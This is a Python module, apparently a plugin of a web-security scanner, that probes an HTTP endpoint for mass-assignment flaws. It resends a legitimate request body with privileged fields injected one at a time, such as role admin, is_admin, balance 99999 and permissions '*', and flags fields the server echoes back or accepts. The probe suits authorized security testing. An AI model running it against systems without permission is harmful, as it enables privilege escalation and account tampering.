"""Mass-assignment probe — does the endpoint accept extra body fields?

Submits a baseline request, then submits the same request with privileged
fields appended (role, is_admin, verified, balance, plan, isStaff, etc.).
If the response indicates one of those fields was bound to the resource
(reflected back, or accepted with a 2xx status while the baseline had a
4xx for the same payload), mass-assignment is in play.

opts shape::
    {
      "method":         "POST" | "PUT" | "PATCH",
      "headers":        auth headers,
      "baseline_body":  dict (the legitimate request body),
      "extra_fields":   optional dict; defaults to a curated set,
      "success_status": status code that means "accepted" (default 200),
    }
"""
from __future__ import annotations

import json
import urllib.request
import urllib.error
from typing import Any, Dict, List

from .base import AttackResult, _result_error


# Curated set of high-impact field names. Each entry: (name, value) where
# the value is what we want to claim if the server binds it.
_DEFAULT_EXTRAS: Dict[str, Any] = {
    "role":      "admin",
    "is_admin":  True,
    "isAdmin":   True,
    "isStaff":   True,
    "admin":     True,
    "verified":  True,
    "email_verified": True,
    "plan":      "enterprise",
    "tier":      "enterprise",
    "balance":   99999,
    "credits":   99999,
    "is_active": True,
    "permissions": ["*"],
    "owner_id":  1,
    "user_id":   1,
}


def _do_request(url: str, method: str, headers: Dict[str, str],
                body: Any, timeout: int) -> Dict[str, Any]:
    data = json.dumps(body).encode("utf-8")
    h = {"Content-Type": "application/json", **(headers or {})}
    req = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read()
            return {"status": resp.status, "len": len(raw),
                    "body": raw[:1500].decode("utf-8", errors="replace")}
    except urllib.error.HTTPError as e:
        try:
            body_bytes = e.read()[:1500].decode("utf-8", errors="replace")
        except Exception:
            body_bytes = ""
        return {"status": e.code, "len": 0, "body": body_bytes}
    except Exception as e:
        return {"status": -1, "len": 0, "body": "", "error": str(e)}


def run(target: str, opts: Dict[str, Any]) -> AttackResult:
    if not target:
        return _result_error("massassign", "target URL required")
    baseline = opts.get("baseline_body")
    if not isinstance(baseline, dict):
        return _result_error("massassign", "baseline_body (dict) required")
    method  = opts.get("method", "POST")
    headers = opts.get("headers") or {}
    extras  = opts.get("extra_fields") or _DEFAULT_EXTRAS
    success_status = int(opts.get("success_status", 200))
    timeout = int(opts.get("timeout_s", 15))

    # Baseline — same body, no injected fields.
    base_resp = _do_request(target, method, headers, baseline, timeout)
    evidence: List[Dict[str, Any]] = [
        {"role": "baseline", "body": baseline, **base_resp}
    ]

    findings: List[str] = []
    confidence_max = 0.0

    # Inject each extra field individually so we know which one bound.
    for k, v in extras.items():
        injected = {**baseline, k: v}
        resp     = _do_request(target, method, headers, injected, timeout)
        ev_entry = {"role": "injected", "field": k, "value": v,
                    "body": injected, **resp}
        evidence.append(ev_entry)

        # Signal 1: injected field name appears in response body (echo).
        if k in resp["body"]:
            findings.append(f"server echoed injected field '{k}'")
            confidence_max = max(confidence_max, 0.85)
        # Signal 2: baseline was rejected but injected accepted (binding
        # changed the auth/permission decision).
        if (base_resp["status"] >= 400 and resp["status"] == success_status):
            findings.append(f"baseline {base_resp['status']} → injected "
                            f"{resp['status']} with extra '{k}'")
            confidence_max = max(confidence_max, 0.90)

    if findings:
        return AttackResult(
            technique="massassign", success=True, confidence=confidence_max,
            summary="Mass-assignment: " + "; ".join(findings[:3]),
            evidence=evidence,
        )
    return AttackResult(
        technique="massassign", success=False, confidence=0.0,
        summary=f"No mass-assignment binding detected across "
                f"{len(extras)} field probes",
        evidence=evidence,
    )
